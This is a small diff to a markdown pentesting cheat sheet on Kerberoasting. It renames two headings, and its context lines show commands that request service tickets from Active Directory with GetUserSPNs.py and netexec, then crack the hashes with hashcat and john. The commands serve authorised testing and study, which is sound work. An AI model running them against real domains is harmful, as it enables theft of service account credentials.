@@ -16,12 +16,12 @@ GetUserSPNs.py -dc-ip <DC_IP_ADDRESS> <domain>/ -usersfile <users_file> -no-prea
 netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting kerberoastables.txt --kdcHost <KeyDistributionCenter>
 ```
 
-## Crack GetUserSPNs using hashcat
+## Crack Kerberoasting GetUserSPNs using hashcat
 ```
 hashcat -m 13100 --force -a 0 <hash_file> </path/to/wordlist>
 ```
 
-## crack GetUserSPNs using john
+## crack Kerberoasting GetUserSPNs using john
 ```
 john --format=krb5tgs --wordlist=</path/to/wordlist> kerberoastables.txt
 ```
